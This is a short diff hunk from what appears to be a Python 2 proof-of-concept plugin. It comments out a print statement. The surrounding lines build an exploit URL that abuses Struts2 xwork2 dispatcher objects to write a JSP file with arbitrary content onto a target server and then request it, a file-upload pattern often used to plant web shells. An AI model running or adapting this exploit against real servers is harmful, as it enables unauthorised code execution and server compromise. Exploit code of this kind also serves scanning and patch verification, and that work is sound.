@@ -49,7 +49,7 @@ class P(T):
               "er.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatch" \
               "er.HttpServletResponse&reqobj=%2f&reqobj={filename}&content={" \
               "content}".format(url=target_url, filename=jsp_file, content=content)
-        print target_url
+        #print target_url
         try:
             res=urllib2.urlopen(poc_url,timeout=timeout)
             res_html = res.read()
